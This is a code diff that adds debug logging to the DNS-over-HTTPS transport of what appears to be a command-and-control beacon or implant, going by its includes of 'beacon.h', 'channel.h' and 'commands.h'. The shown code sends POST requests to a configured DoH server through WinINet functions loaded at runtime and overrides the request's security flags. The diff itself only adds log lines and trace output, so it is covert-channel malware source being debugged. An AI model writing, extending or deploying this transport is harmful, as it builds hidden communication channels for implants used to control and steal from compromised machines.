@@ -29,6 +29,7 @@
 #include "beacon.h"
 #include "channel.h"
 #include "commands.h"
+#include "spawn_trace.h"
 
 #define DOH_MAX_PACKET 4096
 #define DOH_ATTEMPTS   3
@@ -46,12 +47,17 @@ static BOOL doh_init(void) {
 	char * p, * slash;
 	char * server = setting_ptr(SETTING_DOH_SERVER);
 
-	if (doh_ready_checked)
+	if (doh_ready_checked) {
+		spawn_log("doh init cached ready=", (long)doh_ready);
 		return doh_ready;
+	}
 	doh_ready_checked = TRUE;
 
-	if (server == NULL || strlen(server) < 8)
+	spawn_log("doh init entered", 0x7fffffff);
+	if (server == NULL || strlen(server) < 8) {
+		spawn_log("doh init fail: server empty", 0x7fffffff);
 		return FALSE;
+	}
 	lstrcpynA(url, server, sizeof(url) - 1);
 
 	p = url;
@@ -220,8 +226,10 @@ static int doh_exchange(unsigned char * query, int qlen,
 	int rv = -1;
 	DWORD flags = 0;
 
-	if (!doh_wininet())
+	if (!doh_wininet()) {
+		spawn_log("doh exch fail: wininet load", 0x7fffffff);
 		return -1;
+	}
 
 	if (strlen(verb) == 0)
 		verb = "POST";
@@ -238,16 +246,22 @@ static int doh_exchange(unsigned char * query, int qlen,
 	         | INTERNET_FLAG_NO_AUTO_REDIRECT;
 
 	session = WI.InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	if (session == NULL)
+	if (session == NULL) {
+		spawn_log("doh exch InternetOpen gle=", (long)GetLastError());
 		goto done;
+	}
 	connect = WI.InternetConnectA(session, doh_host, doh_port, NULL, NULL,
 	                               INTERNET_SERVICE_HTTP, 0, 0);
-	if (connect == NULL)
+	if (connect == NULL) {
+		spawn_log("doh exch InternetConnect gle=", (long)GetLastError());
 		goto done;
+	}
 	request = WI.HttpOpenRequestA(connect, verb, doh_path, NULL, NULL,
 	                               acceptTypes, flags, 0);
-	if (request == NULL)
+	if (request == NULL) {
+		spawn_log("doh exch HttpOpenRequest gle=", (long)GetLastError());
 		goto done;
+	}
 	WI.InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS,
 	                      &secFlags, sizeof(secFlags));
 
@@ -255,18 +269,24 @@ static int doh_exchange(unsigned char * query, int qlen,
 	          "Content-Type: %s\r\nAccept: %s\r\n",
 	          accept, accept);
 
-	if (!WI.HttpSendRequestA(request, headers, (DWORD)-1L, query, qlen))
+	if (!WI.HttpSendRequestA(request, headers, (DWORD)-1L, query, qlen)) {
+		spawn_log("doh exch SendRequest gle=", (long)GetLastError());
 		goto done;
+	}
 
 	{
 		char code[8] = { 0 };
 		DWORD len = sizeof(code) - 1;
 		if (!WI.HttpQueryInfoA(request,
 		               HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
-		               code, &len, NULL))
+		               code, &len, NULL)) {
+			spawn_log("doh exch QueryInfo gle=", (long)GetLastError());
 			goto done;
-		if (*(DWORD *)code != 200)
+		}
+		if (*(DWORD *)code != 200) {
+			spawn_log("doh exch http status=", (long)(*(DWORD *)code));
 			goto done;
+		}
 	}
 
 	while (total < rmax) {
